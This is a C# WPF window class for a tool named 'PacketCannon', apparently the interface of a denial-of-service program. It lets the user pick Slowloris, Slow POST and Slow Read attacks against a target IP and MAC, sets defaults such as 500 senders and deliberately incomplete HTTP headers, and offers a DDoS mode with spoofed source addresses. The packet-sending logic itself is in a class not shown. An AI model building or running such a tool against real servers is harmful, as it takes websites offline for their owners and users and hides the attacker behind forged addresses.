using PcapDotNet.Core;
using PcapDotNet.Packets.Ethernet;
using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Controls;

namespace PacketCannon
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow
    {
        public PacketDevice PacketDevice;
        public DosController Setup;
        private Thread _senders;

        public MainWindow()
        {
            Setup = new DosController();
            InitializeComponent();

            this.DataContext = Setup;
            ResetAllAdditionalSettingsFields();
        }

        private void HostIpAddressChanged(object sender, TextChangedEventArgs e)
        {
            if (!Regex.IsMatch(HostIpAddress.Text, @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"))
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.Red;
            }
            else
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.DarkGray;
                Setup.SelectedDevice = PacketDevice;
                Setup.SourceIpv4 = HostIpAddress.Text;
            }
        }

        private void TargetIpAddressChanged(object sender, TextChangedEventArgs e)
        {
            if (!Regex.IsMatch(HostIpAddress.Text, @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"))
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.Red;
            }
            else
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.DarkGray;
                Setup.SelectedDevice = PacketDevice;
                Setup.DestinationIpV4 = TargetIpAddress.Text;
            }
        }

        private void ChooseIntButtonClick(object sender, RoutedEventArgs e)
        {
            var interfaceWindow = new IntWindow();
            interfaceWindow.Show();
            IsEnabled = false;
        }

        private void GetTargetMacButtonClick(object sender, RoutedEventArgs e)
        {
            string a;
            try
            {
                a = DosController.GetMacFromIp(TargetIpAddress.Text).ToString();
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message, "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (a == "00:00:00:00:00:00")
            {
                if (DosController.PingAddress(TargetIpAddress.Text))
                {
                    TargetMacAddress.Text = DosController.GetMacFromIp(DosController.GetDefaultGateway().ToString()).ToString();
                    return;
                }
                MessageBox.Show("INVALID IP ADDRESS GIVEN", "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            else TargetMacAddress.Text = a;
        }

        private void Attacks_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            Setup.ChangeAttackMode(Attacks.SelectedIndex.ToString());

            if (SlowLorisHeaderCheckBox != null) // IN CREATING OF INT, TEXTBOXES ARE NULL
            {
                HideAllAdditionalSettingsTextAndCheckBoxes(Visibility.Hidden);

                ResetAllAdditionalSettingsFields();

                switch (Attacks.SelectedIndex.ToString())
                {
                    case "0":
                        SlowLorisHeaderCheckBox.Visibility = Visibility.Visible;
                        SlowLorisHeaderTextBox.Visibility = Visibility.Visible;
                        SlowLorisKeepAliveDataCheckBox.Visibility = Visibility.Visible;
                        SlowLorisKeepAliveDataTextBox.Visibility = Visibility.Visible;
                        break;

                    case "1":
                        SlowPostHeaderCheckbox.Visibility = Visibility.Visible;
                        SlowPostHeaderTextBox.Visibility = Visibility.Visible;
                        SlowPostContentLengthTextBox.Visibility = Visibility.Visible;
                        SlowPostContentLengthLabel.Visibility = Visibility.Visible;
                        break;

                    case "2":
                        SlowReadUrlCheckBox.Visibility = Visibility.Visible;
                        SlowReadUrlTextBox.Visibility = Visibility.Visible;
                        SlowReadWinSizeCheckBox.Visibility = Visibility.Visible;
                        SlowReadWindowSizeTextBox.Visibility = Visibility.Visible;
                        break;
                }
            }
        }

        private void ResetAllAdditionalSettingsFields()
        {
            SlowLorisHeaderTextBox.Text = $"GET /? 654865241562456 HTTP / 1.1\r\nHost: {HostAddress.Text} \r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42";
            SlowLorisKeepAliveDataTextBox.Text = "X-a: b";

            SlowReadUrlTextBox.Text = @"/index.html";

            SlowReadWindowSizeTextBox.Text = "10";

            SlowPostHeaderTextBox.Text = "1000000";

            SlowPostContentLengthTextBox.Text = $"POST /textform.php HTTP/1.1\r\nHost: {HostAddress.Text}  \r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n";

            StartPortTextBox.Text = "5000";

            PortStepTextBox.Text = "1";

            SenderCountTextBox.Text = "500";

            SendersWaveTimeTextBox.Text = "2000";

            SendersTimeBetweenTextBox.Text = "10";
        }

        private void HideAllAdditionalSettingsTextAndCheckBoxes(Visibility visibility)
        {
            SlowReadWindowSizeTextBox.Visibility = visibility;
            SlowLorisHeaderTextBox.Visibility = visibility;
            SlowPostHeaderTextBox.Visibility = visibility;
            //SenderCountTextBox.Visibility = visibility;
            //SendersTimeBetweenTextBox.Visibility = visibility;
            //SendersWaveTimeTextBox.Visibility = visibility;
            //StartPortTextBox.Visibility = visibility;
            //PortStepTextBox.Visibility = visibility;
            SlowLorisKeepAliveDataTextBox.Visibility = visibility;
            SlowReadUrlTextBox.Visibility = visibility;
            SlowPostContentLengthTextBox.Visibility = visibility;

            SlowLorisKeepAliveDataCheckBox.Visibility = visibility;
            SlowLorisHeaderCheckBox.Visibility = visibility;
            SlowPostHeaderCheckbox.Visibility = visibility;
            //SenderCountCheckBox.Visibility = visibility;
            //SendersTimeBetweenCheckBox.Visibility = visibility;
            //SenderWaveTimeCheckBox.Visibility = visibility;
            //StartPortCheckBox.Visibility = visibility;
            //PortStepCheckBox.Visibility = visibility;
            SlowLorisKeepAliveDataCheckBox.Visibility = visibility;
            SlowReadUrlCheckBox.Visibility = visibility;
            SlowReadWinSizeCheckBox.Visibility = visibility;
            SlowPostContentLengthLabel.Visibility = visibility;
        }

        private void CheckBox_Click(object sender, RoutedEventArgs e)
        {
            HideAllAdditionalSettingsTextAndCheckBoxes(Visibility.Visible);

            // else HideAllAdditionalSettingsTextAndCheckBoxes(Visibility.Hidden);
        }

        private void DisableAllTextBoxes()
        {
            SlowReadWindowSizeTextBox.IsEnabled = false;
            SlowLorisHeaderTextBox.IsEnabled = false;
            SlowPostHeaderTextBox.IsEnabled = false;
            SenderCountTextBox.IsEnabled = false;
            SendersTimeBetweenTextBox.IsEnabled = false;
            SendersWaveTimeTextBox.IsEnabled = false;
            StartPortTextBox.IsEnabled = false;
            PortStepTextBox.IsEnabled = false;
            SlowLorisKeepAliveDataTextBox.IsEnabled = false;
            SlowReadUrlTextBox.IsEnabled = false;
        }

        private void OnlyNumbers(object sender, System.Windows.Input.TextCompositionEventArgs e)
        {
            e.Handled = Regex.IsMatch(e.Text, @"[^0-9]");
        }

        private void StartButton_Click(object sender, RoutedEventArgs e)
        {
            Setup.Terminate = false;
            StartButton.IsEnabled = false;
            StopButton.IsEnabled = true;
            if (CheckAllRequiredFields())
            {
                //      MessageBox.Show(
                //          Setup.SourceIpv4 +
                //                      "\n" + Setup.DestinationIpV4 +
                //                      "\n" + Setup.Communicator +
                //                      "\n" + Setup.senderSize +
                //                      "\n" + Setup.Terminate +
                //                      "\n" + Setup.hostAddress +
                //                      "\n" + Setup.senderTimeOut +
                //                      "\n" + Setup.senderWaveTimeOut +
                //                      "\n" + Setup.SourcePort +
                //                      "\n" + Setup.portStep +
                //                      "\n" + Setup.SourceMac +
                //                      "\n" + Setup.DestinationMac +
                //                      "\n" + Setup.SlowPostContentLength +
                //                      "\n" + Setup.SlowLorisKeepAliveData +
                //                      "\n" + Setup.SlowLorisHeaderNotComplete +
                //                      "\n" + Setup.SlowPostHeader +
                //                      "\n" + Setup.SlowReadUrl
                //  , "DOS", MessageBoxButton.OK, MessageBoxImage.Information);
                _senders = new Thread(Setup.StartSenders);
                _senders.Start();
            }
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            Setup.Terminate = true;
            StopButton.IsEnabled = false;
            StartButton.IsEnabled = true;
            _senders.Abort();
        }

        private bool CheckAllRequiredFields()
        {
            if (!TargetIpAddress.Text.Equals("") && !HostIpAddress.Text.Equals("") && !TargetMacAddress.Text.Equals("") && !HostAddress.Text.Equals(""))
            {
                try
                {
                    Setup.DestinationIpV4 = TargetIpAddress.Text;
                    Setup.SourceIpv4 = HostIpAddress.Text;
                    Setup.DestinationMac = new MacAddress(TargetMacAddress.Text);
                    Setup.SourceMac = new MacAddress(HostMacAddress.Text);
                    Setup.HostAddress = HostAddress.Text;
                    CheckAdditionalSettings();
                    CheckDDosSettings();
                    return true;
                }
                catch (ArgumentOutOfRangeException e)
                {
                    MessageBox.Show(e.ParamName, "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
                }
                catch (Exception e)
                {
                    MessageBox.Show("Some field with wrong parameters\n" + e.Message, "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
                }
                Setup.Terminate = true;
                StopButton.IsEnabled = false;
                StartButton.IsEnabled = true;
            }
            return false;
        }

        private void CheckDDosSettings()
        {
            if (SenderCountTextBox.Text == "")
            {
                if (DDosCheckBox.IsChecked == true && Convert.ToInt32(FakeAddressesCount.Text) < 50)
                {
                    throw new ArgumentOutOfRangeException("Dont have enough addresses for every sender");
                }
            }
            else if (DDosCheckBox.IsChecked == true && Convert.ToInt32(SenderCountTextBox.Text) > Convert.ToInt32(FakeAddressesCount.Text))
            {
                throw new ArgumentOutOfRangeException("Dont have enough addresses for every sender");
            }

            if ((bool)DDosCheckBox.IsChecked)
            {
                Setup.Ddos = true;
                if (FakeAddressesCount.Text != "")
                {
                    Setup.DdosCount = Convert.ToInt32(FakeAddressesCount.Text);
                }
            }
        }

        private void CheckAdditionalSettings()
        {
            Setup.SlowPostContentLength =
                SlowReadWindowSizeTextBox.IsEnabled && SlowReadWindowSizeTextBox.Text != ""
                    ? Convert.ToInt32(SlowReadWindowSizeTextBox.Text)
                    : 1000000;

            Setup.SlowLorisHeaderNotComplete = SlowLorisHeaderTextBox.IsEnabled && SlowLorisHeaderTextBox.Text != ""
                ? SlowLorisHeaderTextBox.Text
                : null;

            Setup.SlowPostHeader = SlowPostHeaderTextBox.IsEnabled && SlowPostHeaderTextBox.Text != ""
                ? SlowPostHeaderTextBox.Text
                : null;

            if (SenderCountTextBox.IsEnabled && SenderCountTextBox.Text != "")
            {
                Setup.SenderSize = Convert.ToInt32(SenderCountTextBox.Text);
            }

            if (SendersTimeBetweenTextBox.IsEnabled && SendersTimeBetweenTextBox.Text != "")
            {
                Setup.SenderTimeOut = Convert.ToInt32(SendersTimeBetweenTextBox.Text);
            }

            if (SendersWaveTimeTextBox.IsEnabled && SendersWaveTimeTextBox.Text != "")
            {
                Setup.SenderWaveTimeOut = Convert.ToInt32(SendersWaveTimeTextBox.Text);
            }

            if (StartPortTextBox.IsEnabled && StartPortTextBox.Text != "")
            {
                Setup.SourcePort = Convert.ToInt32(StartPortTextBox.Text);
            }

            if (PortStepTextBox.IsEnabled && PortStepTextBox.Text != "")
            {
                Setup.PortStep = Convert.ToInt32(PortStepTextBox.Text);
            }

            if (SlowLorisKeepAliveDataTextBox.IsEnabled && SlowLorisKeepAliveDataTextBox.Text != "")
            {
                Setup.SlowLorisKeepAliveData = SlowLorisKeepAliveDataTextBox.Text;
            }

            if (SlowReadUrlTextBox.IsEnabled && SlowReadUrlTextBox.Text != "")
            {
                Setup.SlowReadUrl = SlowReadUrlTextBox.Text;
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);

            Application.Current.Shutdown();
        }

        private void EnableDDosClicked(object sender, RoutedEventArgs e)
        {
            if ((bool)DDosCheckBox.IsChecked)
            {
                FakeAddressesCount.IsEnabled = true;
                FakeAddressesCount.Visibility = Visibility.Visible;
                FakeAddressesMaxValue.IsEnabled = true;
                FakeAddressesMaxValue.Visibility = Visibility.Visible;
                FakeAddressesMinValue.IsEnabled = true;
                FakeAddressesMinValue.Visibility = Visibility.Visible;
            }
            else
            {
                FakeAddressesCount.IsEnabled = false;
                FakeAddressesCount.Visibility = Visibility.Hidden;
                FakeAddressesMaxValue.IsEnabled = false;
                FakeAddressesMaxValue.Visibility = Visibility.Hidden;
                FakeAddressesMinValue.IsEnabled = false;
                FakeAddressesMinValue.Visibility = Visibility.Hidden;
            }
            FakeAddressesCount.IsEnabled = DDosCheckBox.IsChecked == true;
        }

        private void TextBox_OnGotFocus(object sender, RoutedEventArgs e)
        {
            //HostAddress.TextWrapping = TextWrapping.Wrap;
            var a = (TextBox)e.OriginalSource;
            if (a != null) a.TextWrapping = TextWrapping.Wrap;
        }

        private void TextBox_OnLostFocus(object sender, RoutedEventArgs e)
        {
            //HostAddress.TextWrapping = TextWrapping.NoWrap;
            var a = (TextBox)e.OriginalSource;
            if (a != null) a.TextWrapping = TextWrapping.NoWrap;
        }
    }
}